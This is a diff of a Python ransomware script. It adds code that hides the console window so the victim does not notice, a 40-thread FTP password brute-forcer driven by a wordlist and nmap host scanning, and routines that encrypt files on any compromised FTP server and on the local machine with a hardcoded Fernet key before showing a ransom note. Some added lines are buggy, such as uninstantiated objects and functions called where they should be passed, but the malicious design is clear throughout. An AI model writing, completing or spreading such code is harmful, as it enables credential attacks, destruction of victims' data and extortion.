@@ -1,17 +1,80 @@
 #!/usr/bin/python3.8
-import win32con
-import win32gui
+import ftplib
+import getpass
+import glob
 import os
-from cryptography.fernet import Fernet
-import getpass, subprocess, time, glob
+import subprocess
+import time
 import tkinter
+from ftplib import FTP
 from tkinter import messagebox
 
+import nmap
+from threading import Thread
+import queue
+import win32con
+import win32gui
+from cryptography.fernet import Fernet
 
-def hide_console():
-    # Hides the terminal console to prevent suspicion while working in background
-    hide = win32gui.GetForegroundWindow()
-    win32gui.ShowWindow(hide, win32con.SW_HIDE)
+
+# Hides the terminal console to prevent suspicion while working in background
+hide = win32gui.GetForegroundWindow()
+win32gui.ShowWindow(hide, win32con.SW_HIDE)
+
+threads = 40
+q = queue.Queue()
+
+passwords = open('passwordlist.txt').read().split('\n')
+for password in passwords:
+    q.put(password)
+
+
+def ftpwork():
+    global password
+    global q
+    ftpserver = ftplib.FTP()
+    user = 'anonymous'
+    port = 21
+    hosts = nmap.PortScanner
+    hosts.all_hosts()
+    password = q.get()
+    time.sleep(5)
+
+    for host in hosts:
+        try:
+            ftpserver.connect(host, port)
+            ftpserver.login(user, password)
+            time.sleep(5)
+
+            filecontent = '*.*'
+            FTP.cwd('/home/FTP')
+            key = "aWC5hXgG06c4lCmPpWxEuczPacxTa1TId-yw3hjZI9E="
+
+            for file in FTP.nlst(filecontent):
+                k = key
+                f = Fernet(k)
+                try:
+                    with open(file, "rb") as doc:
+                        file_data = doc.read()
+                        encrypted_data = f.encrypt(file_data)
+
+                    with open(file, "wb") as doc:
+                        doc.write(encrypted_data)
+                        time.sleep(5)
+
+                except Exception as e:
+                    print(e)
+                    pass
+        except Exception as e:
+            print(e)
+            pass
+        else:
+            with q.mutex:
+                q.queue.clear()
+                q.all_tasks_done.notify_all()
+                q.unfinished_tasks = 0
+        finally:
+            q.task_done()
 
 
 def encrypt_file():
@@ -62,10 +125,11 @@ def encrypt_file():
                 with open(f_name, "rb") as file:
                     file_data = file.read()
                     encrypted_data = f.encrypt(file_data)
-
                 with open(f_name, "wb") as file:
                     file.write(encrypted_data)
-            except Exception:
+                    time.sleep(5)
+            except Exception as e:
+                print(e)
                 pass
 
 
@@ -121,8 +185,14 @@ def delete_ransomware():
 
 
 def main():
-    # hide_console()
-    # encrypt_file()
+    for thread in range(threads):
+        threading = Thread(target=encrypt_file(), daemon=True)
+        threading.start()
+
+    for thread in range(threads):
+        threading = Thread(target=ftpwork(), daemon=True)
+        threading.start()
+
     message()
     ransom_note()
     show_ransom_note()
